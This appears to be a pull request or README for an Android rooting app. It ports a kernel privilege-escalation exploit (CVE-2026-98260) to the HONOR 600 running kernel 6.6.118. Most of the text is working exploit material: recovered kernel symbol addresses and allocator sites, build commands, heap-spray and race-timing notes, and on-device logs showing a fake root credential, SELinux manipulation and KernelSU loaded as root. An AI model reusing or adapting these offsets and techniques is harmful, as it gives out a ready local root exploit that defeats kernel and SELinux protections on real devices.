# HONOR 600 (VKJ-NX9) 6.6.118 CVE-2026-98260 Adaptation

Same 6.6.118 chain as `ports/pkj110-66118`, with a new per-build profile in
`exploit/src/K66118_plant.c`. The existing PKJ110/PKH110 entries are untouched.
The runner reliability changes are enabled by a flag on the HONOR profile only;
the other 6.6.118 profiles keep the original trace-buffer, discovery, and spray
timing.

## Target

- Model: HONOR 600 (VKJ-NX9, `HNVKJX`)
- System: MagicOS 11.0.0.121(C901E4), Android 17, security patch 2026-09-01
- Kernel: `6.6.118-android15-8-gc901ea41aa32-ab15981388-4k`
  (`#1 SMP PREEMPT Thu Jul 30 02:48:45 UTC 2026`, kleaf@build-host, LLD 18.0.0)
- SoC: Snapdragon 7 Gen 4 (SM7750, `sun`)
- KMI: `android15-6.6`
- Artifact: `libk66118.so` (Cargo feature `k66118`), app entry
  `CVE-2026-98260-6.6.118`

## OTA Source and Extraction

The public hihonorcdn crawler snapshot `20261009` lists the full package as
`VKJ-LGRP2-OVS 11.0.0.100(log)` (versionId `918394`):

- `https://update.hihonorcdn.com/TDS/data/bl/files/v918394/f1/full/update_full_base.zip`
  (7,087,343,580 bytes, SHA-256
  `9DA319041D02CBA3AF5BC459B53E759A2D289D6409561EE305472BB65EC1660B`)
- `payload.bin` starts at ZIP offset 828; `payloadOffset=828`,
  `metadataSize=310891`, `metadataHash`/`fileHash` as listed in
  `v918394_filelist.xml`

The payload header is **big-endian** (unlike the usual little-endian protobuf
assumption in some tools):

- magic `CrAU`, version 2, manifest size 310867, metadata signature size 267
- data blob start = `828 + 24 + 310867 + 267 = 311986`
- `boot` partition: 48 operations (REPLACE_XZ x18, REPLACE_BZ x30), 512 blocks
  per extent, rebuilt image size 100,663,296 bytes
- `boot.img` SHA-256
  `27AD9033882EE58C72E162C79DB4D62C2C0E06B0D7D219BE378ECFE294354C5B`
- v4 header, `kernel_size=36,801,024`, kernel Image at `boot.img[0x1000:]`
- kernel Image SHA-256
  `7B5672D23E011F8C575D366AD8D57AB8E7C229C08029BBADB96418D2FCD489C9`
- banner matches the device exactly:
  `Linux version 6.6.118-android15-8-gc901ea41aa32-ab15981388-4k`

Only HTTP Range requests were used; the full 7 GB archive was never downloaded.

## Constants

Recovered with `ports/coloros-61269/recover.py` from the extracted kernel Image
(`kallsyms: n=110146 ... shift=+0`):

```c
#define TARGET_KERNEL_RELEASE      "6.6.118-android15-8-gc901ea41aa32-ab15981388-4k"

/* do_timer_create+0xa4: BL kmem_cache_alloc_noprof; site = BL+4 */
#define STATIC_TIMER_SITE          0xffffffc080195d50ULL
#define TIMER_SITE_LOW21           0x195d50ULL

/* copy_process+0x13c: BL kmem_cache_alloc_node_noprof; site = BL+4 */
#define COPY_PROCESS_LOW21         0x0ab93cULL

/* kallsyms link-time addresses */
#define SELINUX_STATE_STATIC       0xffffffc08236a2e0ULL
#define PANIC_ON_WARN_STATIC       0xffffffc08211ae0cULL
#define ROOT_USER_STATIC           0xffffffc08213f1e0ULL
#define INIT_USER_NS_STATIC        0xffffffc08213ef50ULL
#define INIT_UCOUNTS_STATIC        0xffffffc082140cb0ULL
#define INIT_GROUPS_STATIC         0xffffffc082140740ULL
```

`tools/kernel_profile_check.py` confirms both sites:

```
0xffffffc080195d50 (site-4): insn=0x94079e42 BL -> 0xffffffc08037d654
0xffffffc0800ab93c (site-4): insn=0x940b49a3 BL -> 0xffffffc08037dfc4
```

BTF matches the other 6.6 builds: `k_itimer` 0x108, `cred` 0xb8,
`task_struct` 0x12c0 (`cred`@0x820), `selinux_state` 0x80,
`tracepoint.funcs`@0x48. The data-symbol block is identical to the
`gc4127a25dcf3-ab15863337` profile; only the timer/copy sites differ.

## Device Kernel Config Notes

`/proc/config.gz` is readable on the locked device (kallsyms/BTF/boot block are
not). Relevant settings:

- `CONFIG_KALLSYMS_ALL=y`, `CONFIG_DEBUG_INFO_BTF=y`, `CONFIG_RANDOMIZE_BASE=y`
- `CONFIG_KASAN=y` (HW tags), `CONFIG_CFI_CLANG=y`, `CONFIG_SHADOW_CALL_STACK=y`
- `CONFIG_MODULE_SIG=y`, `CONFIG_MODVERSIONS=y`; `CONFIG_MODULE_SIG_FORCE` is unset
- `CONFIG_USER_NS` is **not** set; the 6.6 plant does not use user namespaces

## Build

```sh
cd exploit/rust-kplant
ANDROID_NDK_HOME=/opt/android-sdk/ndk/28.2.13676358 \
  cargo build --release --target aarch64-linux-android \
  --no-default-features --features k66118
cp target/aarch64-linux-android/release/kplant \
  ../../app/app/src/main/jniLibs/arm64-v8a/libk66118.so
```

## App Build

The patched debug APK was assembled with JDK 21, Android SDK 37.0,
build-tools 37.0.0, and Gradle 9.7.0:

```sh
cd app
ANDROID_HOME=/opt/android-sdk JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64 \
SHARK_VERSION_NAME=2.5.1-en.6 SHARK_VERSION_CODE=1039 \
  /opt/gradle-9.7.0/bin/gradle :app:assembleDebug --no-daemon
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

Local artifact: `app/app/build/outputs/apk/debug/app-debug.apk`
(83,051,383 bytes, SHA-256
`003b7baeb951907795b5afafc12e5ebc49f7b94f2f1045024e329d888449d103`).
The APK is stamped `2.5.1-en.6` (versionCode 1039), so the in-app updater does
not offer the upstream en.6 APK. Its `lib/arm64-v8a/libk66118.so` is rebuilt
from this branch's source (447,064 bytes, SHA-256
`b9e2bf543b178471a89dbf7af67038b76dd5eedd8797abe058208a5535cae6ed`) and
contains the `gc901ea41aa32` profile. The bundled `.so` was rebuilt from this
PR's source with the pinned NDK and Cargo toolchain; the non-HONOR runners
(`libk61269.so`, `libk61238.so`, `libk61258.so`) rebuild byte-identically
because the reliability changes are gated to the HONOR profile.

After installing, the app's home screen reports:

```
Kernel version  6.6.118-android15-8-gc901ea41aa32-ab15981388-4k
Exploit         CVE-2026-98260-6.6.118
```

so the new release maps to `ExploitKind.CVE66118` at runtime.

## Status

- [x] Exact stock kernel Image obtained from the Honor full OTA
- [x] `kallsyms`/BTF layouts recovered and cross-checked
- [x] Both allocator BL sites validated in the kernel Image
- [x] Profile and app kernel map entry added
- [x] Read-only `__plant probe` passed on the device:
  `PROBE_KERNEL`/`PROFILE_66118` matched, `PROBE_TIMER site=...95d50`,
  `PROBE_TASK expected_low21=0xab93c`, `PROBE_CRED req=0xb8 alloc=0xc0`,
  `PROBE_LINEAR_MAP=0xffffff7f80000000`, `PROBE_OK`
- [x] Full fake-cred chain passed on a clean boot:
  `fake_cred` -> `selinux` -> `fake_uid`, then
  `[child] woke uid=0 euid=0`, `PLANT_CRED_OK child=...`,
  `resuid=0/0/0`
- [x] KernelSU manager late-load through the full runner
  (`./k66118 run`): `LATE_LOAD_RC=0`, `MODULE_LOADED`,
  `kernelsu 180224 2 - Live`, `su` ->
  `uid=0(root) gid=0(root) ... context=u:r:ksu:s0`, `MANAGER_START=late-load`,
  `DONE`, `RC=0`
- [x] Previous en.2-based patched APK rebuilt with the fixed runner and
  installed; the app home screen selects `CVE-2026-98260-6.6.118` for this
  kernel release
- [x] In-app one-click confirmed on-device with that build after granting
  Shizuku v13.5
- [x] Source merged with upstream `v2.5.1-en.6` (YukiSU, pairing/supervisor
  services, KASLR low-21 fix); the HONOR profile and spray reliability fixes
  are retained
- [x] `k61269`, `k61238`, `k61258`, and `k66118` all rebuild against the merged
  source, and the `2.5.1-en.6` APK was assembled
- [x] Pre-gating en.6 `libk66118.so` and APK confirmed working on-device
- [x] Reliability fixes gated to the HONOR profile; the gated APK and runner
  rebuild cleanly
- [x] Final gated `2.5.1-en.6` APK (versionCode 1039) installed and run on a
  clean boot: `PROFILE_66118` matched, `[trace] buffer_size_kb=8195 (was 1410)`,
  `PLANT_CRED_OK`, `MODULE_LOADED`, `MANAGER_START=late-load`, `DONE`,
  `exploit exit=0`, `RESULT=SUCCESS`, `EXIT=0`; the log also shows
  `[trace] buffer_size_kb restored to 1410`, and the post-run sysfs value is
  back at `1410`

## Verified Run

The final gated `2.5.1-en.6` APK (versionCode 1039, SHA-256
`003b7baeb951907795b5afafc12e5ebc49f7b94f2f1045024e329d888449d103`)
was installed on a clean boot and run through the one-tap flow. The in-app
History log for 2026-11-26 00:08:10 shows:

```
EXPLOIT=CVE-2026-98260-6.6.118
KERNEL=6.6.118-android15-8-gc901ea41aa32-ab15981388-4k
PROFILE_66118=6.6.118-android15-8-gc901ea41aa32-ab15981388-4k
[trace] buffer_size_kb=8195 (was 1410)
PLANT_CRED_OK child=13295
PARKED=1
[trace] buffer_size_kb restored to 1410
LATE_LOAD_RC=0
MODULE_LOADED
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
MANAGER_START=late-load
DONE
exploit exit=0
RESULT=SUCCESS
EXIT=0
DURATION=10046ms
```

Post-run state: `getenforce` = `Enforcing`,
`/sys/kernel/tracing/buffer_size_kb` = `1410`, `tracing_on` = `0`.

## Runtime Notes

- These fixes are enabled only for the HONOR profile. The other 6.6.118
  profiles keep the original behavior.
- The page-free race is probabilistic. The victim slab can stay on the SLUB
  per-CPU partial list after the exec, so the plant churns
  `posix_timers_cache` to force it back to the buddy allocator. The churn can
  free the victim page after the last spray burst has drained, and the page
  then merges into a larger buddy block that order-1 spray can never reach.
  `spray_thread()` therefore keeps a steady one-write-per-millisecond drip
  running in addition to the bursts, so an order-1 allocation is always in
  flight when the page appears. A forced-churn run (test hook
  `PYB110_FORCE_CHURN=1`) then hit all three stages at 113/130/73 ms; the
  normal full run hit at 27/146/14 ms.
- A failed stage still holds the victim zombie and cannot safely retry in the
  same process; reboot before another attempt.
- The stock per-CPU trace ring is 1410 KiB. `grow_trace_buffer()` requests
  8 MiB before discovery; without it, the spray can evict the victim's
  `page_alloc` record and report a false burst miss. The value is read back
  and stepped down to 4 MiB if the kernel clamps it, and the original size is
  restored before the plant parks or exits. The app also skips its own
  `buffer_size_kb=1` reset for this release, so the restored 1410 KiB value
  persists; that reset remains a fallback for the other profiles. On the
  HONOR 600 the grown ring is about 64 MiB across 8 CPUs; the verified run
  succeeded with roughly 1.3 GiB `MemAvailable`, so the ring does not create
  memory pressure.
- SELinux is left `Permissive` after a partial run; reboot to restore
  `Enforcing` before testing again.
